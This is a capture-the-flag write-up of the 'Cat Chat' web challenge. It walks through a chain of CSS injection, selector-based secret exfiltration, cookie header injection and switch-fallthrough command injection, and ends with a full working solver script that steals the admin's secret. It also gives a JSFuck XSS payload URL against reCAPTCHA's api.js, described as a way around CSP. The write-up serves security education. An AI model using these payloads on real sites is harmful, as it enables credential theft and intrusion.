# Cat Chat &ndash; wirteup by @terjanq


## Description

> Welcome to Cat Chat! This is your brand new room where you can discuss anything related to cats. You have been assigned a random nickname that you can change any time.

> Rules:
- You may invite anyone to this chat room. Just share the URL.
- Dog talk is strictly forbidden. If you see anyone talking about dogs, please report the incident, and the admin will take the appropriate steps. This usually means that the admin joins the room, listens to the conversation for a brief period and bans anyone who mentions dogs.

> Commands you can use: (just type a message starting with slash to invoke commands)
  - `/name YourNewName` - Change your nick name to YourNewName.
  - `/report` - Report dog talk to the admin.
>  
Btw, the core of the chat engine is open source! You can download the source code [here](./files/server.js).
>
Alright, have fun!


In the source code, we also can find the commented section containing the commands for administrative purposes.

> Admin commands: 
- `/secret asdfg` - Sets the admin password to be sent to the server with each command for authentication. It's enough to set it once a year, so no need to issue a /secret command every time you open a chat room.
- `/ban UserName` - Bans the user with UserName from the chat (requires the correct admin password to be set).

### So our goal is simple. Find a way to steal the admin's password!


## Page Functionality
After reading the provided sources of the website, I came to the following conclusions:
- *Every request to the API (`/report`, `/secret <password>`, `/ban <name>`, `<message>`, `/name <new name>`) is made by `GET` request in the form of: `https://cat-chat.web.ctfcompetition.com/room/<room id>/send?name=<name>&msg=<message>`*
- *There are no session cookies. The only cookies received from the server are: `flag=` which stands for the secret password set by `/secret` command and `banned=` determining either user has been banned for d\*g talk or not.*
- *There is no `csrf` mechanism, except for the `report` command which is being authorized by the `Google reCAPTCHA`.*
- *`Content Security Policy` ([CSP]) is as following:*

```
Content-Security-Policy: 
  default-src 'self'; # Default source is `https://cat-chat.web.ctfcompetition.com/*` if no rule matched
  style-src 'unsafe-inline' 'self'; # The source is either inline object `<style>...</style>` or `self` 
  script-src 'self' https://www.google.com/recaptcha/ https://www.gstatic.com/recaptcha/; # `self` or from these two domains
  frame-src 'self' https://www.google.com/recaptcha/ # `self` or from `https://www.google.com/recaptcha/*`
```
*So no urls in the form of `data: ...` are allowed and any trial of downloading resource from an external domain will be blocked.*
- *There are basicaly two types of the requests which I will be calling `global` and `private` respectively. First ones are those which are being broadcasted to all participants in the chatroom such as `/report` `/ban`, `<message>` and `/name` and the second which are being seen only by the user invoking them such as `/rename` and `/secret`. These are handled by the `EventSource` object inside [catchat.js] script.*
- *Data is being escaped only by the client side and it is done by the following function: `let esc = (str) => str.replace(/</g, '&lt;').replace(/>/g, '&gt;').replace(/"/g, '&quot;').replace(/'/g, '&apos;');`*
- *When admin joins the room he is using exactly the same page as the others but with invoked function `cleanupRoomFullOfBadPeople()`.*


# CSS Injection
It seems that every parsed element on the website is properly escaped so including an additional [DOM Element] is rather impossible. It is done by the function `esc(str)` mentioned earlier which replaces each character `'`, `"`, `<`, `>` with their [HTML Entity] substitutes. But there is exactly one element improperly escaped element allowing us to do the [CSS Injection]! Let's have a closer look at it.
```js
display(`${esc(data.name)} was banned.<style>span[data-name^=${esc(data.name)}] { color: red; }</style>`);
```
We see that escaping `data.name` in the current way won't prevent the mentioned vulnerability. I believe that there are either `quotation marks` outside ot `${esc(data.name)}` missed or escaping `[` and `]` which would prevent this type of attack. For the sake of an example let's change our name to `i] body{background: red} i[i=` then the inserted element (after being banned for *I ❤ dogs!* message) should look like: `i] body{background: red} i[i= was banned.<style>span[data-name^=i] body{background: red} i[i=]{color: red; }</style>` which is a valid `CSS Code`. Let's try our payload on the website! 

![css_injection]

Firstly, we used the fact that anyone can join the same room, so we used two windows to observe the outcome. Then we changed our name to the payload above. And finally, we have called for an admin just to message *I ❤ dogs!* in a moment he joins. As we can see, every participant in the chat room will have red background except the one being banned. 


But how to use it to steal admin's secret key? Well, this is the question that we have no direct response on yet but the idea is to generate a proper set of [CSS Selectors] sending sensitive data over. I will shortly explain how these selectors work in a simple example. Suppose we have exactly one `<input id="secret" value="Top Secret Value"` element and two selectors `#secret[value^=T]{background: url(http://malicious.website/?ch=T)}` and `#secret[value^=t]{background: url(http://malicious.website/?ch=t)}` which in natural language translates to *If element of id 'secret' starts with prefix '&lt;prefix&gt;' set its background value to '&lt;color&gt;'*. The important thing here is that the content from the provided *URL* will not be preloaded which means that it's only fetched when the element is going to be rendered. Thanks to it we can get to know every character in the `value` attribute by consistently expanding our prefix of already known characters.

## Self Injection
But hey, we cannot send any information outside the domains from the `CSP` header! So how can we acquire it? And what exactly are we going to steal in the first place?

Let's find an answer to the second question first. We know that there is a special command `/secret <new password>` which basically sets a new password with following calling the function ``display(`Successfully changed secret to <span data-secret="${esc(cookie('flag'))}">*****</span>`)``. This has to be it! We can make our selector to look like `span[data-secret^=<prefix>]{background: url(...)}`. The next mystery is how can we obtain the information without sending information out. This is the tricky part. We will use the fact that any `API` call is not being authorized in any way, so making the URL `url(send?name=flag&msg=<prefix>)` will result with a new message on the chat from *flag* user containing the prefix of the fetched secret if and only if such element exists on the page. So let's try this.

![self_injection]

As expected, we got two messages &ndash; one from us, one from an admin.

## Header Injection
Okay, it seems that we have all we need to steal the admin's password. We know that the password will likely start with `CTF{` but any trial with such payloads had failed... But why it's not working? This is why *“It's enough to set it once a year, so no need to issue a /secret command every time you open a chat room.”*. Admin already joined with the password set and there is no element on the page which we need! 
Maybe if somehow we had forced the admin to send the command `/secret` on the page we could get what we seek. Could we include it in the `background: url(...send?msg=secret)`? Sadly no, we can not. It is because the `/secret` command is a type of `private` and there is no way we could process the response. Maybe we could somehow make the `/secret` command public and broadcast it to all users? Let's move away from it for a while and focus on how exactly would changing the password help us. We don't want to know the changed one, we want to know the original one! I've tested if we can change the admin's password at all by firstly sending a payload with the url `/send?msg=/secret 12345` and then `/ban <me>` to see if I get banned. And Nah, it's now working. I mean the idea is not working because I am not getting banned.

Let's have a closer look at the `/secret <arg[1]>` instruction inside the provided source of [server.js] script. 
```js
if (!(arg = msg.match(/\/secret (.+)/))) break;
        res.setHeader('Set-Cookie', 'flag=' + arg[1] + '; Path=/; Max-Age=31536000');
        response = {type: 'secret'};
```
This looks like the [Header Injection]! Well, although we cannot insert [CRLF] \(**C**ariage-**R**eturn **L**ine-**F**eed) characters to make the whole response as we want due to sanizitaion from the `Node.js`, we can make the cookie invalid! Imagine the following header: `Set-cookie: flag=123456; Domain=adsad; Path=/; Max-Age-31536000` created from the command `/secret 123456; Domain=adsad`. We can read from the [documentation] that
> Domain=&lt;domain-value&gt;  
>
  Specifies those hosts to which the cookie will be sent. If not specified, defaults to the host portion of the current document location (but not including subdomains). Contrary to earlier specifications, leading dots in domain names are ignored. If a domain is specified, subdomains are always included.

And later:
> A cookie belonging to a domain that does not include the origin server should be rejected by the user agent.

So we can send a valid header with an invalid cookie. This is exactly what we need! The browser will reject the new cookie and the script will handle the `/secret` command so the `display()` function will be invoked.

![header_injection]

## Command Injection Failure
Up to this moment, I went through all the steps relatively quick. I thought that only minutes divide me from the solution and there were no solves on the task yet as I recall correctly. But my excitation was too quick and I got lost in it so badly... For my excuse it was a tough time for solving the CTF task &ndash; the middle of the **Summer Exam Session** on University I attend to.

The solution is quite simple and I was almost there if only had I made the correct payload in time.  
I looked at the following piece of [server.js] code

```js
if (!(req.headers.referer || '').replace(/^https?:\/\//, '').startsWith(req.headers.host)) {
    response = {type: "error", error: 'CSRF protection error'};
  } else if (msg[0] != '/') {
    broadcast(room, {type: 'msg', name, msg});
  } else {
    switch (msg.match(/^\/[^ ]*/)[0]) {
      case '/name':
        if (!(arg = msg.match(/\/name (.+)/))) break;
        response = {type: 'rename', name: arg[1]};
        broadcast(room, {type: 'name', name: arg[1], old: name});
      case '/ban':
        if (!(arg = msg.match(/\/ban (.+)/))) break;
        if (!req.admin) break;
        broadcast(room, {type: 'ban', name: arg[1]});
      case '/secret':
        if (!(arg = msg.match(/\/secret (.+)/))) break;
        res.setHeader('Set-Cookie', 'flag=' + arg[1] + '; Path=/; Max-Age=31536000');
        response = {type: 'secret'};
      case '/report':
        if (!(arg = msg.match(/\/report (.+)/))) break;
        var ip = req.headers['x-forwarded-for'];
        ip = ip ? ip.split(',')[0] : req.connection.remoteAddress;
        response = await admin.report(arg[1], ip, `https://${req.headers.host}/room/${room}/`);
    }
  }
```
and my first thoughts were: 
* **There are no breaks in the switch statement**
* **only the first [RegExp]** `msg.match(/^\/[^ ]*/)[0]` correctly matches the command code (start of the `msg` attribute) and the ones inside switch statement (e.x `/\/name (.+)/`) match occurence of the command regardless the position of *backslash* character. 

So I tested the payload `/name super_name /secret 123456` hoping that I shall see two commands from one message executed but it didn't work... I had yet tested a few payloads but after a failure, assumed that it has to be that switches in *JavaScript* work the way *IFs* would work. I know, I know. Cleverest assumption of the day. 

If you read up to this moment you probably know the complete solution already, but before revealing it, I will try to show my thinking process after rejecting this mentioned possibility. If you don't wish to read the part not really related to the solution just jump into [The Command Injection Once More](#the-command-injection-once-more) :)

I don't remember the exact order of the things I had tried, but it does not really matter at this point.

### X-Forwarded-For

There is a misterious part of code in the [server.js] source 
```js
case '/report':
        if (!(arg = msg.match(/\/report (.+)/))) break;
        var ip = req.headers['x-forwarded-for'];
        ip = ip ? ip.split(',')[0] : req.connection.remoteAddress;
        response = await admin.report(arg[1], ip, `https://${req.headers.host}/room/${room}/`);
```
which looks very very suspicious. The exact line I am thinking of is `var ip = req.headers['x-forwarded-for'];`. When we type `/report` in the chat our IP is beeing sent over to the admin, but purpose of it is highly unknow since we lack the knowledge of `const admin = require('./admin');` module. But the idea of forging my *IP* by setting the [HTTP header] `x-forwarded-for` to anything I desire seemed to me like a something worth a try. I tested over for any kind of injection came to my head starting with the [CSRF], ending with the [SQL Injection], preceeded with the [XSS Injection]. But assumed none of these actualy worked since I dind't get an outcome. 

### Searching for broadcast
After that, I had decided to run my own instance of the server and test things out locally and tried really hard to call the `broadcast(room, msg)` function with `/secret` command included. And then hoping that there is a part of code on the client side, I hadn't yet found, allowing to execute two commands in there. This trial was of course hardly unsuccessful and the payloads I was creating were ridiculous looking at it from the current perspective. The only good thing that came out from, was that I successfully created my own instance and could test things out more effectively from now on.


### Searching for XSS
Even though I assumed there is no possibility of [XSS Injection], and if there was any the whole solution would zip into one-line solution but the path I already followed seemed to be the correct way, I was searching for possible `XSS` point on the website. And surprisingly I have found one! I found a vulnerability in the Google ReCaptcha functionality. 
`<script src="https://www.google.com/recaptcha/api.js?render=6LeB410UAAAAAGkmQanWeqOdR6TACZTVypEEXHcu"></scrip>` I had made a closer look at this script and tried to inject some *XSS* in here. I found the line in the [api.js] which looked like dynamically created: `... ).push('6LeB410UAAAAAGkmQanWeqOdR6TACZTVypEEXHcu');window ...` so I tried to insert the quote character `'` to close the function call and then insert some code. As for the surprise, it worked. But when one tries to insert any `alphanumeric` character after it, the line changes to: `push('onload')`. So the challenge is to write a payload without using any characters from the mentioned charset. Well, we all know [JSFuck] and creating the URL: [https://www.google.com/recaptcha/api.js?render=6LeB410UAAAAAGkmQanWeqOdR6TACZTVypEEXHcu');&#x5B;&#x5D;&#x5B;(!&#x5B;&#x5D;+&#x5B;&#x5D;)...();('] creates a valid JavaScript code which when attached pops out the `alert(1)`. This a serious security gap since this can be easily used to bypass [CSP] protection on third-party websites, where for the sake of example if we found a place to inject `<script>` element on the website from this task we could execute any code we want even though CSP was set to prevent such situations. The proper *Issue* is in the process of being completed at the time being and will be reported as soon as finished. 


It buzzed me totally so I couldn't focus on the task nor my exams anymore. I was searching for a way how to exploit it further, but it's not the actual subject of this write-up so let's skip it ;)

### The Command Injection Once More
After a whole daybreak, I finally realized what mistake I was making and why my switch exploits didn't work. If you look closer at the switch statements once more, you realize that there is actually a `break` between `/name` and `/secret` commands! It does seem so much invisible because it's hidden after if statement which looks kind of natural, at least for me. So testing the payload `/ban cat_hater /secret 123456; Domain=adsad` on my local instance resulted with successful attached `/secret` command since there is no `break` between these two cases. We can see that admin sends the `/ban` command following the function below
```js
if (msg.match(/dog/i)) {
        send(`/ban ${name}`);
```
so all we have to do is send some dirty **d\*g message** with a name set as `cat_hater /secret 123456; Domain=asdasd` 

![command_injection]


## The complete Solution
To automate the whole process I have written a simple [cat_talks_solver.user.js] script, which could be included inside [Tampermonkey] extension. I have also provided with the minified version of the script [cat_talks_minified.js] where the command is easy to copy-paste into [console]. So this is very easy to reproduce by yourself, so just choose the option fits you the most and try it out! The unminified version of the script:

```js
(function(){
  let pref = 'aa]{}#conversation{overflow-x:hidden}';
  let suf = 'a[x=';
  let flag_style = 'span[data-name=flag], span[data-name=flag] + span{color:red; font-size: 15px}';
  let solve = false;
  window.flag = 'CTF{';
  window.messagebox.placeholder = '!solve type to make machine start';
  let h1 = document.createElement('h1');h1.innerHTML='🔒 The Secret Stealer 🔒';
  document.querySelector('#conversation p').before(h1);

  window.report = () => {
      window.grecaptcha.execute(recaptcha_id, {action: 'report'}).then((token) => send('/report ' + token));
  }

  window.sendMessage = function(name, msg){
    fetch(`send?name=${encodeURIComponent(name)}&msg=${encodeURIComponent(msg)}`);
  }

  window.showDogLove = (name) => sendMessage(name, 'I ❤ dogs!');

  window.template = function(middle=''){
      var res = '';
      var alph = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!-?@_{}~';
      for (let c of alph){
          let _flag = (window.flag + c).replace(/{/g, '\\7b').replace(/}/g, '\\7d');
          res += `span[data-secret^=${_flag}]{background:url(send?name=flag&msg=${_flag})}`;
      }
      return pref+middle+res+suf;
  }

  function autoFetch() {
    let last = window.conversation.lastElementChild;
    var interval = setInterval(function() {
      var p;
      while (p = last.nextElementSibling) {
        last = p;

        if (p.tagName != 'P' || p.children.length < 2) continue;
        let name = p.children[0].innerText;
        let msg = p.children[1].innerText;

        if(msg == '!solve'){
            solve = true;
            sendMessage('bot', "I has made the machine start!");  
            window.report();
            break;
        }
        if(!solve) break;

        if(/CTF{.+}/.test(window.flag)) {
            setTimeout(sendMessage, 1000, 'flag', window.flag);
            solve=false;
            clearInterval(interval);
            break;
        }

        if(name == 'flag'){
            window.flag = msg;
            window.showDogLove(template());
            break;
        }
        if(name == 'admin'){
            if(msg == 'Bye') window.report();
            if(msg.startsWith("I've been notified")){
                window.showDogLove(template(flag_style));
                window.showDogLove('/secret 123; Domain=asdasd'); 
            }
            break;
        }
      }
    }, 100);
  }

  autoFetch();

})()
```
### And this is the script in an action, very satisfying to watch! 

![solution]

And we can see the flag already.  
Flag: **CTF{L0LC47S_43V3R}**

## My thoughts
I think I got very unlucky with the task and as I recall correctly I had huge chances to hit the first solve on the problem (had 8-10th on the *JS Safe 2.0* already). 

After all, the solution consisted of multiple vulnerabilities such as **[CSS Injection]**, **[Header Injection]**, **[RegExp] Injection**, **Improper Switch Statement** and **Self Injection** used to fetch the flag. So, in my opinion, the task has a good educational purpose, especially for people beginning with the `Web Category` in the **CTF** World. 

Personally, I enjoyed the task very much even though it costed my a significant pile of my hair :))
___


## Resources:
* https://www.owasp.org/index.php/Testing_for_CSS_Injection_(OTG-CLIENT-005)
* https://www.owasp.org/index.php/HTTP_Response_Splitting
* https://www.owasp.org/index.php/Cross-Site_Request_Forgery_(CSRF)
* https://www.owasp.org/index.php/CRLF_Injection

* https://www.w3schools.com/html/html_entities.asp
* https://www.w3schools.com/jsref/dom_obj_all.asp
* https://www.w3schools.com/html/html_css.asp
* https://www.w3schools.com/cssref/css_selectors.asp

* https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Set-Cookie
* https://developer.mozilla.org/en-US/docs/Web/JavaScript/Guide/Regular_Expressions
* https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers
* https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP

* http://tampermonkey.net/
* https://developers.google.com/web/tools/chrome-devtools/console/


## My GitHub profile:
* https://github.com/terjanq



___
[CSS Injection]: <https://www.owasp.org/index.php/Testing_for_CSS_Injection_(OTG-CLIENT-005)>
[CRLF]: <https://www.owasp.org/index.php/CRLF_Injection>
[CSRF]: <https://www.owasp.org/index.php/Cross-Site_Request_Forgery_(CSRF)>
[Header Injection]: <https://www.owasp.org/index.php/HTTP_Response_Splitting>
[SQL Injection]: <https://www.owasp.org/index.php/SQL_Injection>
[XSS Injection]: <https://www.owasp.org/index.php/Cross-site_Scripting_(XSS)>

[CSS Code]: <https://www.w3schools.com/html/html_css.asp>
[HTML Entity]: <https://www.w3schools.com/html/html_entities.asp>
[DOM Element]: <https://www.w3schools.com/jsref/dom_obj_all.asp>
[CSS Selectors]: <https://www.w3schools.com/cssref/css_selectors.asp>

[documentation]: <https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Set-Cookie>
[RegExp]: <https://developer.mozilla.org/en-US/docs/Web/JavaScript/Guide/Regular_Expressions>
[HTTP Header]: <https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers>
[CSP]: <https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP>


[Tampermonkey]: <http://tampermonkey.net/>
[console]: <https://developers.google.com/web/tools/chrome-devtools/console/>


[solution]: <./gifs/solution.gif>
[command_injection]: <./gifs/command_injection.gif>
[css_injection]: <./gifs/css_injection.gif>
[header_injection]: <./gifs/header_injection.png>
[self_injection]: <./gifs/self_injection.png>


[server.js]: <./files/server.js>
[catchat.js]: <./files/catchat.js>

[cat_talks_solver.user.js]: <./cat_talks_solver.user.js>
[cat_talks_minified.js]: <./cat_talks_solver_minified.js>


[JSFuck]: <http://www.jsfuck.com/>
[api.js]: <https://www.google.com/recaptcha/api.js?render=6LeB410UAAAAAGkmQanWeqOdR6TACZTVypEEXHcu>
[https://www.google.com/recaptcha/api.js?render=6LeB410UAAAAAGkmQanWeqOdR6TACZTVypEEXHcu');&#x5B;&#x5D;&#x5B;(!&#x5B;&#x5D;+&#x5B;&#x5D;)...();(']: <https://www.google.com/recaptcha/api.js?render=6LeB410UAAAAAGkmQanWeqOdR6TACZTVypEEXHcu%27%29%3b%5b%5d%5b%28%21%5b%5d%2b%5b%5d%29%5b%2b%5b%5d%5d%2b%28%5b%21%5b%5d%5d%2b%5b%5d%5b%5b%5d%5d%29%5b%2b%21%2b%5b%5d%2b%5b%2b%5b%5d%5d%5d%2b%28%21%5b%5d%2b%5b%5d%29%5b%21%2b%5b%5d%2b%21%2b%5b%5d%5d%2b%28%21%21%5b%5d%2b%5b%5d%29%5b%2b%5b%5d%5d%2b%28%21%21%5b%5d%2b%5b%5d%29%5b%21%2b%5b%5d%2b%21%2b%5b%5d%2b%21%2b%5b%5d%5d%2b%28%21%21%5b%5d%2b%5b%5d%29%5b%2b%21%2b%5b%5d%5d%5d%5b%28%5b%5d%5b%28%21%5b%5d%2b%5b%5d%29%5b%2b%5b%5d%5d%2b%28%5b%21%5b%5d%5d%2b%5b%5d%5b%5b%5d%5d%29%5b%2b%21%2b%5b%5d%2b%5b%2b%5b%5d%5d%5d%2b%28%21%5b%5d%2b%5b%5d%29%5b%21%2b%5b%5d%2b%21%2b%5b%5d%5d%2b%28%21%21%5b%5d%2b%5b%5d%29%5b%2b%5b%5d%5d%2b%28%21%21%5b%5d%2b%5b%5d%29%5b%21%2b%5b%5d%2b%21%2b%5b%5d%2b%21%2b%5b%5d%5d%2b%28%21%21%5b%5d%2b%5b%5d%29%5b%2b%21%2b%5b%5d%5d%5d%2b%5b%5d%29%5b%21%2b%5b%5d%2b%21%2b%5b%5d%2b%21%2b%5b%5d%5d%2b%28%21%21%5b%5d%2b%5b%5d%5b%28%21%5b%5d%2b%5b%5d%29%5b%2b%5b%5d%5d%2b%28%5b%21%5b%5d%5d%2b%5b%5d%5b%5b%5d%5d%29%5b%2b%21%2b%5b%5d%2b%5b%2b%5b%5d%5d%5d%2b%28%21%5b%5d%2b%5b%5d%29%5b%21%2b%5b%5d%2b%21%2b%5b%5d%5d%2b%28%21%21%5b%5d%2b%5b%5d%29%5b%2b%5b%5d%5d%2b%28%21%21%5b%5d%2b%5b%5d%29%5b%21%2b%5b%5d%2b%21%2b%5b%5d%2b%21%2b%5b%5d%5d%2b%28%21%21%5b%5d%2b%5b%5d%29%5b%2b%21%2b%5b%5d%5d%5d%29%5b%2b%21%2b%5b%5d%2b%5b%2b%5b%5d%5d%5d%2b%28%5b%5d%5b%5b%5d%5d%2b%5b%5d%29%5b%2b%21%2b%5b%5d%5d%2b%28%21%5b%5d%2b%5b%5d%29%5b%21%2b%5b%5d%2b%21%2b%5b%5d%2b%21%2b%5b%5d%5d%2b%28%21%21%5b%5d%2b%5b%5d%29%5b%2b%5b%5d%5d%2b%28%21%21%5b%5d%2b%5b%5d%29%5b%2b%21%2b%5b%5d%5d%2b%28%5b%5d%5b%5b%5d%5d%2b%5b%5d%29%5b%2b%5b%5d%5d%2b%28%5b%5d%5b%28%21%5b%5d%2b%5b%5d%29%5b%2b%5b%5d%5d%2b%28%5b%21%5b%5d%5d%2b%5b%5d%5b%5b%5d%5d%29%5b%2b%21%2b%5b%5d%2b%5b%2b%5b%5d%5d%5d%2b%28%21%5b%5d%2b%5b%5d%29%5b%21%2b%5b%5d%2b%21%2b%5b%5d%5d%2b%28%21%21%5b%5d%2b%5b%5d%29%5b%2b%5b%5d%5d%2b%28%21%21%5b%5d%2b%5b%5d%29%5b%21%2b%5b%5d%2b%21%2b%5b%5d%2b%21%2b%5b%5d%5d%2b%28%21%21%5b%5d%2b%5b%5d%29%5b%2b%21%2b%5b%5d%5d%5d%2b%5b%5d%29%5b%21%2b%5b%5d%2b%21%2b%5b%5d%2b%21%2b%5b%5d%5d%2b%28%21%21%5b%5d%2b%5b%5d%29%5b%2b%5b%5d%5d%2b%28%21%21%5b%5d%2b%5b%5d%5b%28%21%5b%5d%2b%5b%5d%29%5b%2b%5b%5d%5d%2b%28%5b%21%5b%5d%5d%2b%5b%5d%5b%5b%5d%5d%29%5b%2b%21%2b%5b%5d%2b%5b%2b%5b%5d%5d%5d%2b%28%21%5b%5d%2b%5b%5d%29%5b%21%2b%5b%5d%2b%21%2b%5b%5d%5d%2b%28%21%21%5b%5d%2b%5b%5d%29%5b%2b%5b%5d%5d%2b%28%21%21%5b%5d%2b%5b%5d%29%5b%21%2b%5b%5d%2b%21%2b%5b%5d%2b%21%2b%5b%5d%5d%2b%28%21%21%5b%5d%2b%5b%5d%29%5b%2b%21%2b%5b%5d%5d%5d%29%5b%2b%21%2b%5b%5d%2b%5b%2b%5b%5d%5d%5d%2b%28%21%21%5b%5d%2b%5b%5d%29%5b%2b%21%2b%5b%5d%5d%5d%28%28%21%5b%5d%2b%5b%5d%29%5b%2b%21%2b%5b%5d%5d%2b%28%21%5b%5d%2b%5b%5d%29%5b%21%2b%5b%5d%2b%21%2b%5b%5d%5d%2b%28%21%21%5b%5d%2b%5b%5d%29%5b%21%2b%5b%5d%2b%21%2b%5b%5d%2b%21%2b%5b%5d%5d%2b%28%21%21%5b%5d%2b%5b%5d%29%5b%2b%21%2b%5b%5d%5d%2b%28%21%21%5b%5d%2b%5b%5d%29%5b%2b%5b%5d%5d%2b%28%21%5b%5d%2b%5b%5d%5b%28%21%5b%5d%2b%5b%5d%29%5b%2b%5b%5d%5d%2b%28%5b%21%5b%5d%5d%2b%5b%5d%5b%5b%5d%5d%29%5b%2b%21%2b%5b%5d%2b%5b%2b%5b%5d%5d%5d%2b%28%21%5b%5d%2b%5b%5d%29%5b%21%2b%5b%5d%2b%21%2b%5b%5d%5d%2b%28%21%21%5b%5d%2b%5b%5d%29%5b%2b%5b%5d%5d%2b%28%21%21%5b%5d%2b%5b%5d%29%5b%21%2b%5b%5d%2b%21%2b%5b%5d%2b%21%2b%5b%5d%5d%2b%28%21%21%5b%5d%2b%5b%5d%29%5b%2b%21%2b%5b%5d%5d%5d%29%5b%21%2b%5b%5d%2b%21%2b%5b%5d%2b%5b%2b%5b%5d%5d%5d%2b%5b%2b%21%2b%5b%5d%5d%2b%28%21%21%5b%5d%2b%5b%5d%5b%28%21%5b%5d%2b%5b%5d%29%5b%2b%5b%5d%5d%2b%28%5b%21%5b%5d%5d%2b%5b%5d%5b%5b%5d%5d%29%5b%2b%21%2b%5b%5d%2b%5b%2b%5b%5d%5d%5d%2b%28%21%5b%5d%2b%5b%5d%29%5b%21%2b%5b%5d%2b%21%2b%5b%5d%5d%2b%28%21%21%5b%5d%2b%5b%5d%29%5b%2b%5b%5d%5d%2b%28%21%21%5b%5d%2b%5b%5d%29%5b%21%2b%5b%5d%2b%21%2b%5b%5d%2b%21%2b%5b%5d%5d%2b%28%21%21%5b%5d%2b%5b%5d%29%5b%2b%21%2b%5b%5d%5d%5d%29%5b%21%2b%5b%5d%2b%21%2b%5b%5d%2b%5b%2b%5b%5d%5d%5d%29%28%29%3b%28%27)>